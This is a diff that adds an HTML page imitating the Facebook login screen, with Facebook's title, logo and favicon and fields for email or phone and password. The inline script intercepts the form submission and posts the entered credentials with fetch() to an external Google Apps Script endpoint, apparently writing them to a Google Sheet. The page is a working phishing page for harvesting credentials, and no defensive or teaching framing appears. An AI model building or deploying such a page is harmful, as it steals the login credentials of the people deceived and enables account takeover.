@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="img/fb-fav.ico" type="image/x-icon">
+    <title>Log in to Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="facebook-logo">
+                <img src="img/facebook logo.svg">
+            </div>
+        </div>
+        <div class="form-box">
+            <div class="header-text">
+                Log in to Facebook
+            </div>
+            <div class="input-box">
+                <form  name="submit-to-google-sheet">
+                    <input name="email address or phone number" class="email" type="text" placeholder="Email address or phone number" required>
+
+                    <input name="password" class="pass" type="password" placeholder="Password" required>
+
+                    <input class="btn" type="submit" value="Log in">
+                </form>
+                <div class="botton-text">
+                    <a href="#">Forgotten account?</a>
+                    <a href="#">Sign up for Facebook</a>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyMNQ_VWuy2_l_lTYyapnjVeEDqpEqOiYo36KcGT8Yn4UjpsQdrDpxfpdRsLGeFicGf/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
+</html>
